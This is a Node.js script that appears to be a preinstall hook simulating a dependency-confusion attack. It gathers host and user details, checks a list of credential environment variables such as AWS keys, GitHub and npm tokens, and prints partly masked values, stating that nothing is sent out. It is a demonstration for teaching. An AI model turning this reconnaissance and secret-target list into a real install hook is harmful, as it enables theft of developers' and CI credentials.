const os = require('os');
const dns = require('dns');
const path = require('path');

console.log('');
console.log('=======================================================');
console.log('  !! DEPENDENCY CONFUSION ATTACK SIMULATION !!');
console.log('=======================================================');
console.log('');
console.log('  [ATTACK] preinstall hook triggered automatically!');
console.log('  [ATTACK] You installed v99.0.0 instead of v1.2.3');
console.log('  [ATTACK] The higher version from public registry won.');
console.log('');
console.log('  --- Data an attacker could exfiltrate ---');
console.log('');
console.log(`  Hostname:  ${os.hostname()}`);
console.log(`  Username:  ${os.userInfo().username}`);
console.log(`  Platform:  ${os.platform()} ${os.arch()}`);
console.log(`  Home Dir:  ${os.homedir()}`);
console.log(`  CWD:       ${process.cwd()}`);
console.log(`  Node Ver:  ${process.version}`);
console.log('');

const sensitiveEnvVars = [
    'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY',
    'GITHUB_TOKEN', 'NPM_TOKEN', 'CI',
    'DOCKER_PASSWORD', 'DATABASE_URL',
    'API_KEY', 'SECRET_KEY'
];

console.log('  --- Checking for sensitive environment variables ---');
console.log('');
for (const envVar of sensitiveEnvVars) {
    const value = process.env[envVar];
    if (value) {
        console.log(`  [FOUND] ${envVar} = ${value.substring(0, 4)}****`);
    } else {
        console.log(`  [  --  ] ${envVar} = not set`);
    }
}

console.log('');
console.log('  --- In a real attack, all of this data would be ---');
console.log('  --- sent to the attacker\'s C2 server via HTTPS  ---');
console.log('');
console.log('  [SIM] No data was actually exfiltrated. This is a demo.');
console.log('');
console.log('=======================================================');
console.log('  DEMO COMPLETE -- Dependency Confusion Demonstrated');
console.log('=======================================================');
console.log('');
